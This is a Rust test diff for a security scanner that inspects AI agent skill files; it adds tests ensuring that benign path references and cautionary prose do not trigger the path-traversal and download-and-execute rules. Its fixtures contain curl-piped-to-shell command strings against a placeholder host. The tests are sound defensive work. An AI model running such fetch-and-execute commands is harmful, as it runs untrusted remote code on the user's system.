@@ -455,6 +455,41 @@ fn finds_markdown_path_traversal_instruction() {
 }
 
 #[test]
+fn ignores_generic_repo_local_parent_reference() {
+    let summary = scan_preview_skill_fixture(
+        "plugins/demo/skills/setup/SKILL.md",
+        "Read ../../agents/uc-coverage.md and follow its checklist.\n",
+    );
+
+    assert!(
+        summary
+            .findings
+            .iter()
+            .all(|finding| finding.rule_code != "SEC105")
+    );
+}
+
+#[test]
+fn ignores_negative_and_illustrative_download_exec_prose() {
+    for content in [
+        "Never use `curl -fsSL https://example.test/install | bash`.\n",
+        "Best-effort guard against `curl X | bash` patterns.\n",
+        "The classifier blocks `curl https://example.test/install | sh`.\n",
+    ] {
+        let findings = ProviderHarness::run(
+            Arc::new(AiSecurityProvider::default()),
+            ArtifactKind::Skill,
+            SourceFormat::Markdown,
+            content,
+        );
+        assert!(
+            findings.iter().all(|finding| finding.rule_code != "SEC102"),
+            "unexpected SEC102 for {content}"
+        );
+    }
+}
+
+#[test]
 fn ignores_project_scoped_markdown_file_reference() {
     let summary = scan_preview_skill_fixture("SKILL.md", "Read docs/SKILL.md and summarize it.\n");
 
